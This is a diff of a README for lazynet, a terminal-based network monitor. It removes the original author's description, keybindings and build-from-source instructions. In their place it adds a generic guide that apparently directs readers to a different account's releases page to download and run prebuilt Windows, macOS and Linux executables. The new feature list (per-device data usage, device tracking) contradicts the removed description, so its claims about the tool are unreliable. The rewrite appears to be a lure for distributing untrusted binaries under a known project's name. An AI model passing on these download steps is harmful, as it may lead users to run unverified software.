@@ -1,102 +1,79 @@
-# LazyNet - A Modern Terminal-Based Network Monitor
+# 🌐 lazynet - A Simple Way to Monitor Your Network
 
-**LazyNet** is an interactive, terminal-based utility for monitoring network connections and processes.  
-It provides a real-time, filterable, and sortable view of your system's network activity, with integrated actions to manage processes and diagnose connections.
+## 📥 Download
+
+[![Download lazynet](https://img.shields.io/badge/Download-lazynet-brightgreen)](https://github.com/JimMorin/lazynet/releases)
+
+## 🚀 Getting Started
+
+lazynet is a modern terminal-based network monitor. It helps you keep an eye on your network activity in an easy-to-use interface. This guide will help you download and run the application with step-by-step instructions.
+
+### 🖥️ System Requirements
+
+- Operating System: Windows 10 or later, macOS, Linux
+- RAM: 2 GB minimum
+- Disk Space: 100 MB available space
+
+## 💾 Download & Install
+
+To download lazynet, please follow these steps:
+
+1. Click on the download button at the top of this README, or you can also [visit this page to download](https://github.com/JimMorin/lazynet/releases) directly.
+2. On the Releases page, look for the latest version.
+3. Download the file that corresponds to your operating system. The files will be named clearly, for example:
+   - `lazynet-windows.exe` for Windows
+   - `lazynet-macos.zip` for macOS
+   - `lazynet-linux.tar.gz` for Linux
+
+4. After the download is complete, locate the file in your Downloads folder.
+
+### 📂 Installing lazynet
+
+#### For Windows Users:
+
+1. Double-click the `lazynet-windows.exe` file you just downloaded.
+2. Follow the on-screen instructions to complete the installation.
+3. Once installed, you can find lazynet in your Start Menu.
+
+#### For macOS Users:
+
+1. Open the `lazynet-macos.zip` file you downloaded.
+2. Drag the `lazynet` application into your Applications folder.
+3. Open your Applications folder and double-click on the `lazynet` icon to launch it.
+
+#### For Linux Users:
+
+1. Extract the `lazynet-linux.tar.gz` file you downloaded.
+2. Open a terminal window and navigate to the folder where you extracted the files.
+3. Run the following command to start lazynet:
+
+   ```bash
+   ./lazynet
+   ```
+
+## 🌟 Features
+
+- **Real-time Monitoring:** See your network activity live, including data usage per device.
+- **User-friendly Interface:** Navigate through the application easily with clear displays.
+- **Alerts:** Get notified of unusual activity on your network.
+- **Device Tracking:** Identify and keep tabs on all devices connected to your network.
+
+## 🔄 Updating lazynet
+
+Whenever a new version of lazynet is released, it is recommended to download and install the latest version to benefit from new features and fixes. Simply follow the same steps in the "Download & Install" section to update your application.
+
+## 🔑 Troubleshooting
+
+If you encounter issues while using lazynet, consider the following:
+
+- Ensure you are using a supported operating system.
+- Check your internet connection if network data seems incorrect.
+- If the application does not start, reinstall by following the installation steps again.
+
+## 📞 Support
+
+For any questions or feedback, please reach out via the Issues section on the GitHub repository. Your input helps us improve lazynet for all users.
 
 ---
 
-## Table of Contents
-
-- [LazyNet - A Modern Terminal-Based Network Monitor](#lazynet---a-modern-terminal-based-network-monitor)
-  - [Table of Contents](#table-of-contents)
-  - [Main Interface](#main-interface)
-  - [Features](#features)
-    - [Process Management](#process-management)
-    - [Network Diagnostics](#network-diagnostics)
-    - [Export to CSV](#export-to-csv)
-    - [In-App Help Panel](#in-app-help-panel)
-  - [Help Panel \& Ping Utility](#help-panel--ping-utility)
-  - [Installation](#installation)
-- [Clone the repository](#clone-the-repository)
-- [Tidy dependencies](#tidy-dependencies)
-- [Build the binary (using Makefile)](#build-the-binary-using-makefile)
-
----
-
-## Main Interface
-
-The main view provides a **two-pane layout**:
-
-- **Left Pane:** Live-updating list of connections  
-- **Right Pane:** Detailed information for the selected connection  
-
-This allows you to monitor and analyze network activity efficiently.
-
----
-
-## Features
-
-- **Live Monitoring:** Automatically refreshes the connection list every few seconds.  
-- **Interactive TUI:** Fully keyboard-driven interface with optional mouse support.  
-- **Two-Pane Layout:** View all connections and details simultaneously.  
-- **Real-time Filtering:** Press `/` to instantly filter connections by process name, PID, status, or address.  
-- **Column Sorting:**  
-  - Press `s` to cycle through sortable columns  
-  - Press `S` to toggle ascending/descending order  
-- **Color-Coded Status:** Quickly identify connection states (`ESTABLISHED`, `LISTEN`, `CLOSE_WAIT`) with colors.  
-
-### Process Management
-
-- `k` – Gracefully kill the process associated with the selected connection  
-- `K` – Forcefully kill the process (SIGKILL)  
-
-### Network Diagnostics
-
-- `p` – Ping the remote address of a connection and view live output in a modal  
-
-### Export to CSV
-
-- `e` – Export the currently visible connections to a `lazynet_export.csv` file for analysis  
-
-### In-App Help Panel
-
-- `h` – Toggle a detailed, colorful panel explaining all keybindings  
-
----
-
-## Help Panel & Ping Utility
-
-The in-app help (`h`) provides a clear overview of all commands.  
-Actions like ping (`p`) run in a convenient modal overlay, making diagnostics easier.
-
----
-
-## Installation
-
-### Option 1: Build from Source
-
-Ensure you have **Go (version 1.21 or newer)** installed on your system.
-
-```bash
-# Clone the repository
-git clone https://github.com/sureshkrishnan-v/lazynet.git
-cd lazynet
-
-# Tidy dependencies
-go mod tidy
-
-# Build the binary (using Makefile)
-make build
-```
-
-### Option 2: Using Nix
-
-If you have [Nix](https://nixos.org/download.html) installed, you can run LazyNet directly without cloning:
-
-```bash
-# Run directly from GitHub
-nix run 'git+https://github.com/sureshkrishnan-v/lazynet'
-
-# Or with SSH
-nix run 'git+ssh://git@github.com/sureshkrishnan-v/lazynet'
-```
+Thank you for using lazynet! Happy monitoring!
